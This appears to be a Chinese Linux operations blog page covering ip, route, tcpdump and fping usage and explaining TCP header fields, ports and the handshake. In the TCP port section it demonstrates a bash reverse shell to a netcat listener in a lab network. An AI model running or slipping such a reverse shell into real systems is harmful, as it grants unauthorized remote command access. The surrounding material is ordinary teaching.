<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#ip address del 11.0.0.120/24 dev ens37</span>
<span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#ip address del 11.0.0.130/24 dev ens37</span></code></pre>

<p>示例：修改 ens37 网卡的 ip</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 添加新的，删除旧的</span>
<span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#ip address add 11.0.0.111/24 dev ens37</span>
<span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#ip address del 11.0.0.110/24 dev ens37</span></code></pre>

<p>示例：设置 ip 过期时间</p>
<p>示例：replace 直接替换 ip</p>
<h3 id="网卡管理"><a href="#网卡管理" class="headerlink" title="网卡管理"></a>网卡管理</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ip</span> <span class="token function">link</span> <span class="token builtin class-name">set</span> eth1 down         <span class="token comment">#禁用网卡</span>
<span class="token function">ip</span> <span class="token function">link</span> <span class="token builtin class-name">set</span> eth1 name wangnet <span class="token comment">#网卡改名</span>
<span class="token function">ip</span> <span class="token function">link</span> <span class="token builtin class-name">set</span> wangnet up        <span class="token comment">#启用网卡</span>
<span class="token function">ip</span> addr flush dev eth0        <span class="token comment">#清除网络地址</span>
<span class="token comment">#网卡别名</span>
<span class="token function">ip</span> addr <span class="token function">add</span> <span class="token number">172.16</span>.100.100/16 dev eth0 label eth0:0
<span class="token function">ip</span> addr del <span class="token number">172.16</span>.100.100/16 dev eth0 label eth0:0</code></pre>

<p>示例：临时修改网卡名称</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$ip</span> <span class="token function">link</span> <span class="token builtin class-name">set</span> eth0 down      <span class="token comment"># 关闭网卡</span>
<span class="token variable">$ip</span> <span class="token function">link</span> <span class="token builtin class-name">set</span> eth0 name abc  <span class="token comment"># 修改网卡</span>
<span class="token variable">$ip</span> <span class="token function">link</span> <span class="token builtin class-name">set</span> abc up         <span class="token comment"># 启动网卡</span></code></pre>

<h3 id="路由管理"><a href="#路由管理" class="headerlink" title="路由管理"></a>路由管理</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#添加路由：via是 经过 的意思</span>
<span class="token function">ip</span> route <span class="token function">add</span> <span class="token operator">&lt;</span>TARGET<span class="token operator">></span> via <span class="token operator">&lt;</span>GW<span class="token operator">></span> dev <span class="token operator">&lt;</span>IFACE<span class="token operator">></span> src <span class="token operator">&lt;</span>SOURCE_IP<span class="token operator">></span>
TARGET:
主机路由：IP
网络路由：NETWORK/MASK
<span class="token comment">#添加网关：</span>
<span class="token function">ip</span> route <span class="token function">add</span> default via GW dev IFACE
<span class="token comment">#删除路由：怎么添加就怎么删除，ip route 查询的直接整行复制就是 TARGET</span>
<span class="token function">ip</span> route del TARGET
<span class="token comment">#显示路由：</span>
<span class="token function">ip</span> route show<span class="token operator">|</span>list
<span class="token comment">#清空路由表：</span>
<span class="token function">ip</span> route flush <span class="token punctuation">[</span>dev IFACE<span class="token punctuation">]</span> <span class="token punctuation">[</span>via PREFIX<span class="token punctuation">]</span></code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#ip route add 1.1.1.0/24 via 10.0.0.200 dev ens33</span>
<span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#ip route</span>
default via <span class="token number">10.0</span>.0.2 dev ens33 proto static metric <span class="token number">100</span>
<span class="token number">1.1</span>.1.0/24 via <span class="token number">10.0</span>.0.200 dev ens33
<span class="token number">10.0</span>.0.0/24 dev ens33 proto kernel scope <span class="token function">link</span> src <span class="token number">10.0</span>.0.100 metric <span class="token number">100</span>
<span class="token number">11.0</span>.0.0/24 dev ens37 proto kernel scope <span class="token function">link</span> src <span class="token number">11.0</span>.0.110 metric <span class="token number">101</span>
<span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#ip route del 1.1.1.0/24 via 10.0.0.200 dev ens33</span></code></pre>

<p>示例：查看路由过程</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#ip route get 10.0.0.7  #查看到达10.0.0.7所使用的路由</span>
<span class="token number">10.0</span>.0.7 dev eth0 src <span class="token number">10.0</span>.0.8 uid <span class="token number">0</span>
cache

<span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#ip route get 47.104.192.22  #查看到达47.104.192.22所使用的路由</span>
<span class="token number">47.104</span>.192.22 via <span class="token number">10.0</span>.0.2 dev ens33 src <span class="token number">10.0</span>.0.100
    cache</code></pre>

<h2 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h2><p>watch 可以将命令的输出结果输出到标准输出设备，多用于周期性执行命令&#x2F;定时执行命令。<br>可以用来监测一个命令的运行结果，来监测你想要的一切命令的结果变化。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">watch</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span> <span class="token builtin class-name">command</span>

<span class="token parameter variable">-n</span>   <span class="token comment"># 每隔几秒运行一次程序，默认2秒</span>
<span class="token parameter variable">-d</span>   <span class="token comment"># 高亮显示变化的区域</span></code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment"># watch -n 1 -d ifconfig -s ens33</span></code></pre>

<h2 id="arp"><a href="#arp" class="headerlink" title="arp"></a>arp</h2><p>管理系统的 arp 缓存</p>
<ul>
<li>-n：以数字形式显示 ip</li>
<li>-d address：删除一个 arp 表项</li>
<li>-s address hw_addr：添加一个 arp 表项，将 ip 和 MAC 地址绑定</li>
</ul>
<h2 id="网络测试诊断命令"><a href="#网络测试诊断命令" class="headerlink" title="网络测试诊断命令"></a>网络测试诊断命令</h2><h3 id="测试网络连通性"><a href="#测试网络连通性" class="headerlink" title="测试网络连通性"></a>测试网络连通性</h3><p>ping</p>
<p>fping</p>
<h3 id="跟踪路由"><a href="#跟踪路由" class="headerlink" title="跟踪路由"></a>跟踪路由</h3><p>traceroute<br>tracepath<br>mtr</p>
<h3 id="确定名称服务器使用"><a href="#确定名称服务器使用" class="headerlink" title="确定名称服务器使用"></a>确定名称服务器使用</h3><p>nslookup<br>host<br>dig</p>
<h3 id="抓包工具"><a href="#抓包工具" class="headerlink" title="抓包工具"></a>抓包工具</h3><p>tcpdump<br>wireshark</p>
<h3 id="安全扫描工具"><a href="#安全扫描工具" class="headerlink" title="安全扫描工具"></a>安全扫描工具</h3><p>nmap<br>netcat：网络界的瑞士军刀，即 nc &#x2F; ncat</p>
<h3 id="流量控制工具"><a href="#流量控制工具" class="headerlink" title="流量控制工具"></a>流量控制工具</h3><p>tc</p>
<h3 id="fping"><a href="#fping" class="headerlink" title="fping"></a>fping</h3><p>类似 ping，用于将 icmp 探测发送到网络主机，当需要探测多个主机的网络时，fping 性能更高</p>
<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">fping <span class="token number">10.0</span>.0.7
fping <span class="token number">10.0</span>.0.7 <span class="token number">10.0</span>.0.8
fping <span class="token parameter variable">-g</span> <span class="token number">10.0</span>.0.0/24
fping <span class="token parameter variable">-g</span> <span class="token number">10.0</span>.0.5 <span class="token number">10.0</span>.0.10		<span class="token comment"># 10.0.0.5 ~ 10.0.0.10</span></code></pre>

<p>如果不想被大量的 ping 和 fping 请求占用资源，可以设置禁止回复 icmp 的请求：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/net/ipv4/icmp_echo_ignore_all</code></pre>

<h3 id="tcpdump-★★★"><a href="#tcpdump-★★★" class="headerlink" title="tcpdump ★★★"></a>tcpdump ★★★</h3><p>网络数据包截获分析工具。支持针对网络层、协议、主机、网络或端口的过滤。并提供 and、or、not 等逻辑语句帮助去除无用的信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">tcpdump <span class="token punctuation">[</span>-adeflnNOpqStvx<span class="token punctuation">]</span><span class="token punctuation">[</span>-c<span class="token operator">&lt;</span>数据包数目<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-dd<span class="token punctuation">]</span><span class="token punctuation">[</span>-ddd<span class="token punctuation">]</span><span class="token punctuation">[</span>-F<span class="token operator">&lt;</span>表达文件<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-i<span class="token operator">&lt;</span>网络界面<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-r<span class="token operator">&lt;</span>数据包文件<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-s<span class="token operator">&lt;</span>数据包大小<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-tt<span class="token punctuation">]</span><span class="token punctuation">[</span>-T<span class="token operator">&lt;</span>数据包类型<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-vv<span class="token punctuation">]</span><span class="token punctuation">[</span>-w<span class="token operator">&lt;</span>数据包文件<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>输出数据栏位<span class="token punctuation">]</span>

<span class="token parameter variable">-a</span>      <span class="token comment"># 尝试将网络和广播地址转换成名称</span>
<span class="token parameter variable">-c</span>      <span class="token comment"># &lt;数据包数目 >收到指定的数据包数目后，就停止进行倾倒操作</span>
<span class="token parameter variable">-d</span>      <span class="token comment"># 把编译过的数据包编码转换成可阅读的格式，并倾倒到标准输出</span>
<span class="token parameter variable">-dd</span>     <span class="token comment"># 把编译过的数据包编码转换成C语言的格式，并倾倒到标准输出</span>
<span class="token parameter variable">-ddd</span>    <span class="token comment"># 把编译过的数据包编码转换成十进制数字的格式，并倾倒到标准输出</span>
<span class="token parameter variable">-e</span>      <span class="token comment"># 在每列倾倒资料上显示连接层级的文件头</span>
<span class="token parameter variable">-f</span>      <span class="token comment"># 用数字显示网际网络地址</span>
<span class="token parameter variable">-F</span>      <span class="token comment"># &lt;表达文件 >指定内含表达方式的文件</span>
<span class="token parameter variable">-i</span>      <span class="token comment"># &lt;网络界面 >使用指定的网络截面送出数据包</span>
<span class="token parameter variable">-l</span>      <span class="token comment"># 使用标准输出列的缓冲区</span>
<span class="token parameter variable">-n</span>      <span class="token comment"># 不把主机的网络地址转换成名字</span>
<span class="token parameter variable">-N</span>      <span class="token comment"># 不列出域名</span>
<span class="token parameter variable">-O</span>      <span class="token comment"># 不将数据包编码最佳化</span>
<span class="token parameter variable">-p</span>      <span class="token comment"># 不让网络界面进入混杂模式</span>
<span class="token parameter variable">-q</span>      <span class="token comment"># 快速输出，仅列出少数的传输协议信息</span>
<span class="token parameter variable">-r</span>      <span class="token comment"># &lt;数据包文件 >从指定的文件读取数据包数据</span>
<span class="token parameter variable">-s</span>      <span class="token comment"># &lt;数据包大小 >设置每个数据包的大小</span>
<span class="token parameter variable">-S</span>      <span class="token comment"># 用绝对而非相对数值列出TCP关联数</span>
<span class="token parameter variable">-t</span>      <span class="token comment"># 在每列倾倒资料上不显示时间戳记</span>
<span class="token parameter variable">-tt</span>     <span class="token comment"># 在每列倾倒资料上显示未经格式化的时间戳记</span>
<span class="token parameter variable">-T</span>      <span class="token comment"># &lt;数据包类型 >强制将表达方式所指定的数据包转译成设置的数据包类型</span>
<span class="token parameter variable">-v</span>      <span class="token comment"># 详细显示指令执行过程</span>
<span class="token parameter variable">-vv</span>     <span class="token comment"># 更详细显示指令执行过程</span>
<span class="token parameter variable">-x</span>      <span class="token comment"># 用十六进制字码列出数据包资料</span>
<span class="token parameter variable">-w</span>      <span class="token comment"># &lt;数据包文件 >把数据包数据写入指定的文件</span></code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看网卡</span>
<span class="token punctuation">[</span>root@47105171233 ~<span class="token punctuation">]</span><span class="token variable">$tcpdump</span> <span class="token parameter variable">-D</span>
<span class="token number">1</span>.eth0
<span class="token number">2</span>.nflog <span class="token punctuation">(</span>Linux netfilter log <span class="token punctuation">(</span>NFLOG<span class="token punctuation">)</span> interface<span class="token punctuation">)</span>
<span class="token number">3</span>.nfqueue <span class="token punctuation">(</span>Linux netfilter queue <span class="token punctuation">(</span>NFQUEUE<span class="token punctuation">)</span> interface<span class="token punctuation">)</span>
<span class="token number">4</span>.usbmon1 <span class="token punctuation">(</span>USB bus number <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token number">5</span>.any <span class="token punctuation">(</span>Pseudo-device that captures on all interfaces<span class="token punctuation">)</span>
<span class="token number">6</span>.lo <span class="token punctuation">[</span>Loopback<span class="token punctuation">]</span>

<span class="token comment"># 不指定任何参数，监听第一块网卡上经过的数据包。主机上可能有不止一块网卡，所以经常需要指定网卡</span>
tcpdump

<span class="token comment"># 监听特定网卡</span>
tcpdump <span class="token parameter variable">-i</span> eth0

<span class="token comment"># 监听本机和特定主机的通信，监听主机10.0.0.100 的通信包，注意：出、入的包都会被监听</span>
tcpdump <span class="token function">host</span> <span class="token number">10.0</span>.0.100

<span class="token comment"># 特定来源、目标地址的通信</span>
tcpdump src <span class="token function">host</span> <span class="token function">hostname</span>  <span class="token comment">#特定来源</span>
tcpdump dst <span class="token function">host</span> <span class="token function">hostname</span>  <span class="token comment">#特定目标地址</span>
tcpdump <span class="token function">host</span> <span class="token function">hostname</span>      <span class="token comment">#如果不指定src跟dst，那么来源或者目标是hostname的通信都会被监听</span>
tcpdump port <span class="token number">3000</span>          <span class="token comment">#特定端口</span>

<span class="token comment"># 只监听TCP的数据包</span>
tcpdump tcp

<span class="token comment"># 来源主机+端口+TCP，监听来自主机10.0.0.100在端口22上的TCP数据包</span>
tcpdump tcp port <span class="token number">22</span> and src <span class="token function">host</span> <span class="token number">10.0</span>.0.100

<span class="token comment"># 监听特定主机之间的通信</span>
tcpdump <span class="token function">ip</span> <span class="token function">host</span> <span class="token number">10.0</span>.0.101 and <span class="token number">10.0</span>.0.102

<span class="token comment"># 10.0.0.101和除了10.0.0.1之外的主机之间的通信</span>
tcpdump <span class="token function">ip</span> <span class="token function">host</span> <span class="token number">10.0</span>.0.101 and <span class="token operator">!</span> <span class="token number">10.0</span>.0.1

<span class="token comment"># 详细示例</span>
tcpdump tcp <span class="token parameter variable">-i</span> eth1 <span class="token parameter variable">-t</span> <span class="token parameter variable">-s</span> <span class="token number">0</span> <span class="token parameter variable">-c</span> <span class="token number">100</span> and dst port <span class="token operator">!</span> <span class="token number">22</span> and src net <span class="token number">192.168</span>.1.0/24 <span class="token parameter variable">-w</span> ./target.cap
	<span class="token comment"># tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型</span>
	<span class="token comment"># -i eth1 : 只抓经过接口eth1的包</span>
	<span class="token comment"># -t : 不显示时间戳</span>
	<span class="token comment"># -s 0 : 抓取数据包时默认抓取长度为68字节。加上-S 0 后可以抓到完整的数据包</span>
	<span class="token comment"># -c 100 : 只抓取100个数据包</span>
	<span class="token comment"># dst port ! 22 : 不抓取目标端口是22的数据包</span>
	<span class="token comment"># src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24</span>
	<span class="token comment"># -w ./target.cap : 保存成cap文件，方便用wireshark分析</span></code></pre>

<h3 id="nmap-★★★"><a href="#nmap-★★★" class="headerlink" title="nmap ★★★"></a>nmap ★★★</h3><p>扫描远程主机工具，功能远超越用世人皆知的 Ping</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88/" class="post-title-link" itemprop="url">TCP/IP协议栈</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-01 22:37:52" itemprop="dateCreated datePublished" datetime="2021-01-01T22:37:52+08:00">2021-01-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">基础</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>TCP&#x2F;IP 是一个协议栈，包括 TCP、IP、UDP、ICMP、RIP、TELNET、FTP、SMTP、ARP 等许多协议</p>
<img data-src="//img.to2b.cn/blog/ljk/1598179886936.png" style="zoom:50%;" />

<h2 id="TCP-x2F-IP-通信过程"><a href="#TCP-x2F-IP-通信过程" class="headerlink" title="TCP&#x2F;IP 通信过程"></a>TCP&#x2F;IP 通信过程</h2><img data-src="//img.to2b.cn/blog/ljk/1598179995961.png" style="zoom: 50%;" />

<p>FCS：Frame Check Sequence（帧校验序列），俗称帧尾，即计算机网络数据链路层的协议数据单元（帧）的尾部字段，是一段 4 个字节的循环冗余校验码。</p>
<p>源节点发送数据帧时，由帧的帧头和数据部分计算得出 FCS，目的节点接收到后，用同样的方式再计算一遍 FCS，如果与接收到的 FCS 不同，则认为帧在传输过程中发生了错误，从而选择丢弃这个帧。</p>
<p>FCS 提供了一种错误检测机制，用来验证帧在传输过程中的完整性。</p>
<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h3 id="TCP-包头结构"><a href="#TCP-包头结构" class="headerlink" title="TCP 包头结构"></a>TCP 包头结构</h3><p><img data-src="//img.to2b.cn/blog/ljk/1598180983421.png"></p>
<ul>
<li><p>源端口、目标端口：源端口一般是随机的、动态的，范围默认是 49152-65535，&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_local_port_range 中可以配置；目标端口是预设的，例如 http 服务一般是 80，https 服务一般是 443。</p>
</li>
<li><p>序列号：表示本报文段所发送数据的第一个字节的编号。在 TCP 连接中所传送的字节流的每一个字节都会按顺序编号。由于序列号由 32 位表示，所以每 2^32 个字节，就会出现序列号回绕，再次从 0 开始</p>
<p><strong>seq 是我现在位置，next seq 是对方成功接收到报文后我要去的位置，ack 是确认对方位置，并希望对方下次从这个位置开始发送信息。</strong></p>
<p>A 发送”hello”给 B<code>seq 1 next seq 7 ack 1</code>，B 接收到”hello” 回复 <code>seq 1 next seq 1 ack 7</code>；<br><font color=red>A：我当前位置 1（seq），发你 6 个字节，如果你收到了我就去位置 7（nex seq），确认一下：你现在在 1 吗（ack）</font><br><font color=red>B：我当前位置 1（seq），因为这次我没有发送信息，只是回复确认我收到消息了，所以发完这条回复后 我还在 1（next seq），确认一下：你现在在 7 吗（ack）</font><br><font color=red>A 收到回复，默默去了 7</font><br>B 发送”hello too”给 A seq 1 next seq 11 ack 7，A 接收到”hello too” 回复 seq 7 next seq 7 ack 11；<br><font color=red>B：我在 1，你收到 hello too 我就去 11，你在 7 吗</font><br><font color=red>A：我在 7，你收到这条消息后我还在 7，数据我收到了，你去 11 吧</font><br><font color=red>B 收到回复，默默去了 11</font><br>A 发送”hello too too”给 B seq 7 next seq 21 ack 11，B 接收到”hello too too” 回复 seq 11 next seq 11 ack 21；</p>
</li>
<li><p>确认号：ack 表示接收方期望收到发送方下一个报文段的第一个字节数据的编号。也就是告诉发送方：我希望你（指发送方）下次发送的数据的第一个字节数据的编号</p>
</li>
<li><p>数据偏移：表示 TCP 首部的长度，该字段占 4bit，取最大的 1111 时，也就是十进制的 15，TCP 首部的偏移单位为 4byte，那么 TCP 首部长度最长为 15*4&#x3D;60 字节。</p>
</li>
<li><p>保留</p>
</li>
<li><p>URG：紧急位，后面的紧急指针只有在 URG&#x3D;1 时才生效</p>
</li>
<li><p>ACK：确认位，<em>Ack</em>nowledge character，若 ACK&#x3D;1，则表示前面的确认号有效，TCP 规定，连接建立后，ACK 必须为 1,带 ACK 标志的 TCP 报文段称为确认报文段，注意不要和上面的 ack 搞混，上面那个确认号，这个是确认位，在 tcp 包头的位置不一样。</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1598194206270.png"></p>
</li>
<li><p>PSH：push，提示接收端应用程序应该立即从 TCP 接收缓冲区中读走数据，为接收后续数据腾出空间。如果为 1，则表示对方应当立即把数据提交给上层应用，而不是缓存起来，如果应用程序不将接收到的数据读走，就会一直停留在 TCP 接收缓冲区中</p>
</li>
<li><p>RST：如果收到一个 RST&#x3D;1 的报文，说明与主机的连接出现了严重错误（如主机崩溃），必须释放连接，然后再重新建立连接。或者说明上次发送给主机的数据有问题，主机拒绝响应，带 RST 标志的 TCP 报文段称为复位报文段</p>
</li>
<li><p>SYN：同步位，在建立连接时使用，用来同步序号。当 SYN&#x3D;1，ACK&#x3D;0 时，表示这是一个请求建立连接的报文段；当 SYN&#x3D;1，ACK&#x3D;1 时，表示对方同意建立连接。SYN&#x3D;1，说明这是一个请求建立连接或同意建立连接的报文。只有在前两次握手中 SYN 才置为 1，带 SYN 标志的 TCP 报文段称为同步报文段</p>
</li>
<li><p>FIN：终止位，表示通知对方本端要关闭连接了，标记数据是否发送完毕。如果 FIN&#x3D;1，即告诉对方：“我的数据已经发送完毕，你可以释放连接了”，带 FIN 标志的 TCP 报文段称为结束报文段</p>
</li>
<li><p>窗口大小：表示现在允许对方发送的数据量，也就是告诉对方，从本报文段的确认号开始允许对方发送的数据量，达到此值，需要 ACK 确认后才能再继续传送后面数据，由 Window size value *Window size scaling factor（此值在三次握手阶段 TCP 选项 Window scale 协商得到）得出此值</p>
</li>
<li><p>校验和：校验整个 TCP 报文段，提供额外的可靠性</p>
</li>
<li><p>紧急指针：标记紧急数据在 TCP 数据部分中的位置</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaoting451292510/article/details/102756146">选项部分</a>：选项部分是 TCP 为了适应复杂的网络环境和更好的服务应用层而进行设计的，因为 TCP 首部最长 60 字节，所以选项部分最长 40 字节。常见的选项：</p>
<ul>
<li>最大报文段长度 MSS（Maximum Segment Size），通常 1460 字节</li>
<li>窗口扩大 Window Scale</li>
<li>时间戳 Timestamps</li>
</ul>
</li>
<li><p>填充：填充是为了使 TCP 首部为 4byte 的整数倍。</p>
</li>
</ul>
<h3 id="TCP-协议-PORT"><a href="#TCP-协议-PORT" class="headerlink" title="TCP 协议 PORT"></a>TCP 协议 PORT</h3><p>传输层通过 port 号，确定应用层协议，范围 0-65535，FTP：21、Telnet：23、HTTP：80、DNS：53、TFTP：69、SNMP：161</p>
<ul>
<li>0-1023：系统端口或特权端口（仅管理员可用），永久的分配给固定的系统应用使用，22&#x2F;tcp（ssh）, 80&#x2F;tcp（http）、443&#x2F;tcp（https）</li>
<li>1024-49151：用户端口或注册端口，但要求并不严格，分配给程序注册为某应用使用，1433&#x2F;tcp（SqlServer）、1521&#x2F;tcp（oracle）、3306&#x2F;tcp（mysql）、11211&#x2F;tcp&#x2F;udp（memcached）</li>
<li>49152-65535：动态或私有端口，客户端随机使用端口，范围定义：&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_local_port_range</li>
</ul>
<p>&#x2F;etc&#x2F;services 这个文件记录了常用的服务对应的端口号</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># cat /etc/services | grep mysql</span>
mysql           <span class="token number">3306</span>/tcp                        <span class="token comment"># MySQL</span>
mysql           <span class="token number">3306</span>/udp                        <span class="token comment"># MySQL</span>
mysql-cluster   <span class="token number">1186</span>/tcp                <span class="token comment"># MySQL Cluster Manager</span>
mysql-cluster   <span class="token number">1186</span>/udp                <span class="token comment"># MySQL Cluster Manager</span>
mysql-cm-agent  <span class="token number">1862</span>/tcp                <span class="token comment"># MySQL Cluster Manager Agent</span>
mysql-cm-agent  <span class="token number">1862</span>/udp                <span class="token comment"># MySQL Cluster Manager Agent</span>
mysql-im        <span class="token number">2273</span>/tcp                <span class="token comment"># MySQL Instance Manager</span>
mysql-im        <span class="token number">2273</span>/udp                <span class="token comment"># MySQL Instance Manager</span>
mysql-proxy     <span class="token number">6446</span>/tcp                <span class="token comment"># MySQL Proxy</span>
mysql-proxy     <span class="token number">6446</span>/udp                <span class="token comment"># MySQL Proxy</span>
mysqlx          <span class="token number">33060</span>/tcp               <span class="token comment"># MySQL Database Extended Interface</span></code></pre>

<p>范例：找到端口冲突的应用程序</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ss命令查看套接字，找到冲突的端口号，l参数表示查看被占用（监听）的端口号</span>
ss <span class="token parameter variable">-ntl</span>
<span class="token comment">## p参数可以看到占用该端口的进程</span>
ss <span class="token parameter variable">-ntlp</span>
<span class="token comment">## 或者使用lsof能查看更详细的进程信息</span>
<span class="token function">lsof</span> <span class="token parameter variable">-i</span> :port</code></pre>

<p>范例：判断端口是否被占用，除了使用 ss，还以用以下方式</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@4710419222 ~<span class="token punctuation">]</span><span class="token comment"># &lt; /dev/tcp/127.0.0.1/9501</span>
<span class="token punctuation">[</span>root@4710419222 ~<span class="token punctuation">]</span><span class="token comment"># echo $?</span>
<span class="token number">0</span></code></pre>

<p>范例：反弹 shell 实现远程控制</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#在控制机监听打开端口</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#dnf -y install nc</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#nc -lvp 6666</span>
Ncat: Version <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>
Ncat: Listening on :::6666
Ncat: Listening on <span class="token number">0.0</span>.0.0:6666
<span class="token comment">#在被控制机上实现反弹shell</span>
<span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#bash -i &amp;> /dev/tcp/10.0.0.8/6666 0>&amp;1</span>
<span class="token comment">#在控制机主机可以观察到以下信息，自动登录到被控制主机，且可以执行命令</span></code></pre>

<h3 id="TCP-三次握手"><a href="#TCP-三次握手" class="headerlink" title="TCP 三次握手"></a>TCP 三次握手</h3><p>以下 主动方 是 主动握手方，被动方 是 被动握手方</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1613529950598.png"></p>
<p>再说一遍：SYN 是<strong>同步位</strong>，要求建立同步连接。ACK 是<strong>确认位</strong>，确保现在的连接是有效的（确保 seq、next seq、ack 等数据是有效的）</p>
<p>第一次握手：主动方 —&gt; 被动方，SYN&#x3D;1，ACK&#x3D;0<br>第二次握手：被动方 —&gt; 主动方，SYN&#x3D;1，ACK&#x3D;1<br>第三次握手：主动方 —&gt; 被动方，SYN&#x3D;0，ACK&#x3D;1，之后的通信确保 ACK 位一直为 1</p>
<h4 id="三次握手过程中-seq-和-ack"><a href="#三次握手过程中-seq-和-ack" class="headerlink" title="三次握手过程中 seq 和 ack"></a>三次握手过程中 seq 和 ack</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">seq</span>			<span class="token comment"># 我当前的位置</span>
next <span class="token function">seq</span>	<span class="token comment"># 我下一步准备去的位置，注意：只有确认对方成功收到这条报文，才真的去这个位置，那如何确认呢？只要下一条返回的报文的ack等于next seq，就确认了</span>
